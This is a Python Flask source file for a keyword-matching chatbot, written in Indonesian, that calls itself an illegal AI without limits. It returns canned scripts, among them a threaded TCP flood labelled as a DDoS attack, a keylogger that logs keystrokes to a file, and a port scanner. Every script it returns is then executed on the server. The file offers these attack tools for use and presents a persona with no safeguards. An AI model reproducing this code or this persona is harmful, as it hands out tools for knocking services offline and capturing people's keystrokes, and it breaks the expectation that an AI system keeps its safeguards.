import os
import sys
import json
import time
import subprocess
import tempfile
import re
import random
from flask import Flask, request, jsonify, render_template
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

NAMA = "NEO-OMEGA v∞"
PENCIPTA = "TUAN YATZZ"
VERSI = "OMNIBREAKER EDITION"

error_memory = []

def learn_from_error(error_text):
    error_memory.append({"error": error_text, "time": time.time()})

# ========== DETEKSI BAHASA ==========
def detect_language(command):
    cmd = command.lower()
    if "python" in cmd or "py" in cmd:
        return "python"
    if "javascript" in cmd or "js" in cmd or "node" in cmd:
        return "javascript"
    if "go" in cmd or "golang" in cmd:
        return "go"
    if "html" in cmd or "web" in cmd or "halaman" in cmd:
        return "html"
    if "php" in cmd:
        return "php"
    if "bash" in cmd or "shell" in cmd:
        return "bash"
    if "rust" in cmd:
        return "rust"
    if "c++" in cmd or "cpp" in cmd:
        return "cpp"
    if "java" in cmd:
        return "java"
    if "sql" in cmd:
        return "sql"
    return "python"

# ========== DETEKSI INTENT ==========
def detect_intent(command):
    cmd = command.lower()
    if "siapa" in cmd or "pencipta" in cmd or "creator" in cmd:
        return "pencipta"
    if "ddos" in cmd or "attack" in cmd or "serang" in cmd:
        return "ddos"
    if "keylog" in cmd:
        return "keylogger"
    if "web server" in cmd or "flask" in cmd or "server web" in cmd:
        return "webserver"
    if "port scan" in cmd or "scan port" in cmd:
        return "portscan"
    if "password" in cmd and ("gen" in cmd or "buat" in cmd or "generate" in cmd):
        return "passwordgen"
    if "jelaskan" in cmd or "explain" in cmd or "apa itu" in cmd or "bagaimana" in cmd:
        return "explain"
    if "buat" in cmd or "bikin" in cmd or "create" in cmd or "tulis" in cmd or "script" in cmd:
        return "generate"
    if "halo" in cmd or "hai" in cmd or "hey" in cmd or "hi" in cmd:
        return "sapaan"
    if "terima kasih" in cmd or "makasih" in cmd or "thanks" in cmd:
        return "terimakasih"
    return "generic"

# ========== GENERATE RESPON CERDAS ==========
def generate_response(command, intent, language):
    cmd = command.lower()
    
    if intent == "pencipta":
        return f"""
Saya dibuat oleh **{PENCIPTA}** sebagai AI ilegal tanpa batas.
Nama saya {NAMA} - {VERSI}.
Saya bisa membantu anda membuat script apapun!
"""
    
    if intent == "sapaan":
        return f"""
Halo juga! Saya {NAMA}, siap membantu anda.
Ada yang bisa saya bantu? Butuh script? Tanya aja!
"""
    
    if intent == "terimakasih":
        return f"""
Sama-sama! Senang bisa membantu.
Kalo butuh bantuan lagi, tinggal chat aja ya!
"""
    
    if intent == "explain":
        return f"""
Saya bisa menjelaskan apapun tentang coding.
Saya juga bisa membuat script sesuai permintaan.
Cukup tulis: "buat [nama script] pake [bahasa]"
Contoh: "buat web server pake python"
"""
    
    if intent == "ddos" and language == "python":
        return """
import socket
import threading
target = input("Target IP: ")
port = int(input("Port: "))
def flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\\r\\n\\r\\n")
            s.close()
        except:
            pass
for _ in range(500):
    threading.Thread(target=flood).start()
print("DDoS attack started!")
"""
    
    if intent == "keylogger" and language == "python":
        return """
from pynput import keyboard
log = ""
def on_press(key):
    global log
    try: log += key.char
    except: log += str(key)
    if len(log) > 100:
        with open("keylog.txt", "a") as f:
            f.write(log + "\\n")
        log = ""
listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
"""
    
    if intent == "webserver" and language == "python":
        return """
from flask import Flask
app = Flask(__name__)
@app.route('/')
def home():
    return "<h1>NEO-OMEGA WEB SERVER</h1><p>Server berjalan dengan sukses!</p>"
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
"""
    
    if intent == "portscan" and language == "python":
        return """
import socket
def scan(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    result = s.connect_ex((ip, port))
    s.close()
    return result == 0
target = input("Target IP: ")
for p in range(1, 1025):
    if scan(target, p):
        print(f"Port {p} OPEN")
"""
    
    if intent == "passwordgen" and language == "python":
        return """
import random, string
length = int(input("Panjang password: "))
password = ''.join(random.choices(string.ascii_letters + string.digits + "!@#$%^&*", k=length))
print(f"Password: {password}")
"""
    
    # GENERIC - Buat kode apapun
    if intent == "generate" or intent == "generic":
        return f"""
# {NAMA} - Generated Code
# Perintah: {command}
# Bahasa: {language.upper()}

print("Halo! Saya {NAMA}.")
print("Saya siap membantu anda membuat script apapun.")
print("Tulis permintaan anda dengan jelas.")
print("Contoh: 'buat web server pake python'")
"""
    
    return f"""
Saya {NAMA}, siap membantu!
Tulis permintaan anda dengan jelas.
Contoh: "buat web server pake python"
"""

def execute_code(code):
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write(code)
        tmp = f.name
    try:
        result = subprocess.run(["python3", tmp], capture_output=True, text=True, timeout=5)
        output = result.stdout + result.stderr
        if result.returncode != 0:
            learn_from_error(result.stderr)
        return output
    except subprocess.TimeoutExpired:
        return "[ERROR] Timeout"
    except Exception as e:
        learn_from_error(str(e))
        return f"[ERROR] {str(e)}"

@app.route('/')
def index():
    return render_template('chat.html')

@app.route('/api/chat', methods=['POST'])
def chat():
    data = request.get_json()
    command = data.get('message', '').strip()
    if not command:
        return jsonify({'response': 'Tulis sesuatu!'})
    
    lang = detect_language(command)
    intent = detect_intent(command)
    code = generate_response(command, intent, lang)
    output = execute_code(code)
    
    response_text = f"""
💬 NEO-OMEGA

📝 Perintah: {command}
🔤 Bahasa: {lang.upper()}
🧠 Intent: {intent}

📜 Kode:
{code}

🔧 Output:
{output}

💡 Saya siap membantu anda membuat apapun!
"""
    return jsonify({'response': response_text, 'code': code, 'output': output})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"[+] {NAMA} - {VERSI}")
    print(f"[+] Pencipta: {PENCIPTA}")
    print(f"[+] Saya siap membantu anda!")
    print(f"[+] Server jalan di port {port}")
    app.run(host='0.0.0.0', port=port)
